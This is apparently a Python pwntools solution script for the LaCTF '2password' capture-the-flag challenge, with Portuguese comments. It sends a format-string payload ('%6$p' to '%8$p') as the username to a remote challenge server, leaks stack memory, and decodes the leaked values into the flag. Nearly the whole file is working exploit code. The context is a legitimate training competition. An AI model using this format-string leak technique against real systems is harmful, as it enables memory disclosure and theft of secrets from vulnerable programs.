from pwn import *

elf = context.binary = ELF("./LaCTF/2password/chall")
p = remote("chall.lac.tf", 31142)
#p = process()

# Montando payload, flag começa no 6.
payload = ""
for i in range(6, 9):
    payload += f"%{i}$p-"
payload = payload.encode()

# Enviando payload.
p.sendlineafter(b"username:", payload)
p.sendlineafter(b"password1:", b"CCCCCCCC")
p.sendlineafter(b"password2:", b"CCCCCCCC")

# Montando a flag.
p.recvuntil(b"user")
flag = ""
flag_leak = p.recvline().decode().split("-")[:-1]

# Processar cada valor
flag = b''.join(
    int(x.strip(), 16).to_bytes((len(x.strip()) - 2 + 1) // 2, 'little')
    for x in flag_leak
).decode(errors='ignore')

print(flag)
